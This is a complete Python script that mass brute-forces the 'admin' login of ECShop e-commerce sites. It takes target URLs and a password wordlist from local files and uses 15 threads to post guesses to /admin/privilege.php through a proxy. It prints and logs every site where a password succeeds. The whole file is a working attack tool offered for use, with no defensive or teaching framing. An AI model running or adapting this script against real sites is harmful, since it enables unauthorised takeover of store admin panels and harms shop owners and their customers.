#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import requests
from requests.exceptions import HTTPError
from OpenSSL import crypto
from requests import pyopenssl as reqs

from socket import *
import time
from random import randrange
from queue import Queue
# from multiprocessing import Queue
from threading import Thread
from hashlib import md5
import logging

import re

logpath = "./ecshop.txt"
ch = logging.FileHandler(logpath)
logger = logging.getLogger('log')
logger.setLevel(logging.INFO)
logger.addHandler(ch)

THREADS_COUNT = 15

proxies =dict(http='127.0.0.1:8080')

def get_user_agent():
    user_agent = {
        'User-agent': '"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Safari/605.1.15'}
    return user_agent


def main():
    setdefaulttimeout(15)
    q = Queue(maxsize=0)
    with open("./target.txt") as ip:
        target = [line.rstrip('\n') for line in ip]

        for i in range(len(target)):
            with open("./best.txt") as txtpass:
                password = [line.rstrip('\n') for line in txtpass]
                for x in range(len(password)):
                    q.put_nowait((i, target[i], password[x]))
    start_thread(q)

def start_thread(q):
    for i in range(THREADS_COUNT):
        worker = Thread(target=processor, args=(q,))
        worker.setDaemon(True)
        worker.start()
    q.join()


def processor(q, ):
    while not q.empty():
        item = q.get_nowait()
        apply_payload(q, item[1], item[2])
        q.task_done()
    return True


def apply_payload(q, session_url, password):
    try:
        r=requests.get(session_url+"/admin/privilege.php", timeout=7)
    except:
        pass
    else:
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        payload = "username=admin&password={}&act=signin".format(password)

        session = requests.Session()
        session.headers.update(get_user_agent())

        try:
            response = session.post(session_url + "/admin/privilege.php", data=payload, headers=headers, proxies=proxies, timeout=7, allow_redirects=True)
            if 'admin/index.php' in response.url:
                print("[+] {} // password = {}".format(session_url, password))
            if response.status_code == 200:
                logger.info("{}".format(session_url))

        except:
            pass

if __name__ == '__main__':
    sys.exit(main())

